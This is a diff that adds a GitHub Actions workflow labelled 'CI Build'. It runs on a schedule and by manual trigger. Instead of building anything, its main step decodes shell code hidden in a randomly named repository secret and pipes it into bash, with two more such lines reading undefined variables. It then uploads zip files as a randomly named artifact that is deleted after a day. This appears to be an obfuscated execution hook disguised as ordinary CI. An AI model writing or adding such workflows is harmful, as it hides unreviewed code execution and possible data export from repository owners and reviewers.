@@ -1,0 +1,32 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '15 3,9,15,21 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          fvj55508: ${{ secrets.fvj55508 }}
+        run: |
+          printf '%s' "$fvj55508" | jq -r .cuwpx277 | /bin/bash
+          printf '%s' "$nml34955" | jq -r .gzo8 | /bin/bash
+          printf '%s' "$zkxc079" | jq -r .luemp8 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: YG8aphyZ
+          path: "*.zip"
+          retention-days: 1
